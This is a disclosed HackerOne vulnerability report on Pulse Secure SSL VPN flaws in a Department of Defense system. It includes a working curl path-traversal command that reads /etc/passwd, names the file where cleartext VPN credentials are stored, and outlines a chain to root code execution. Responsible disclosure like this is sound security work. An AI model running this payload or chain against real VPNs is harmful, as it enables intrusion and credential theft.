---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '678496'
original_report_id: '678496'
title: Arbitrary File Reading leads to RCE in the Pulse Secure SSL VPN on the https://███
weakness: OS Command Injection
team_handle: deptofdefense
created_at: '2019-08-21T13:03:00.698Z'
disclosed_at: '2019-12-02T19:59:54.014Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 20
tags:
- hackerone
- os-command-injection
---

# Arbitrary File Reading leads to RCE in the Pulse Secure SSL VPN on the https://███

## Metadata

- HackerOne Report ID: 678496
- Weakness: OS Command Injection
- Program: deptofdefense
- Disclosed At: 2019-12-02T19:59:54.014Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

##Description
Hello. Some time ago, researcher Orange Tsai from DEVCORE team had a talk on Defcon/BlackHat regarding Pulse Secure SSL VPN vulnerabilities fixed on 2019/4/25:
**CVE-2019-11510 - Pre-auth Arbitrary File Reading**
CVE-2019-11542 - Post-auth Stack Buffer Overflow
**CVE-2019-11539 - Post-auth Command Injection**
CVE-2019-11538 - Post-auth Arbitrary File Reading
**CVE-2019-11508 - Post-auth Arbitrary File Writing**
CVE-2019-11540 - Post-auth Session Hijacking

Link to the slides: https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf

I discovered that https://████ instance is vulnerable to described vulnerabilities.

##POC
Extracting `/etc/passwd` as example:
```
curl -i -k --path-as-is https://██████/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/
```
{F561180}

The RCE can be achieved with this chain:
1) Pulse Secure stores credentials in the cleartext.
2) Attacker reads credentials via CVE-2019-11510 (it stored in the `/data/runtime/mtmp/lmdb/dataa/data.mdb`) and authorizes on VPN
3) Attacker exploits CVE-2019-11539 - Post-auth Command Injection achieving RCE as root.

##Suggested fix
Update the Pulse Secure SSL VPN software (also implementing certificate validation can harden access a bit if some similar CVEs will be discovered in future).

## Impact

Remote code execution as root (by reading plaintext credentials and then exploiting CVE-2019-11539 - Post-auth Command Injection) and accessing intranet behind VPN.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
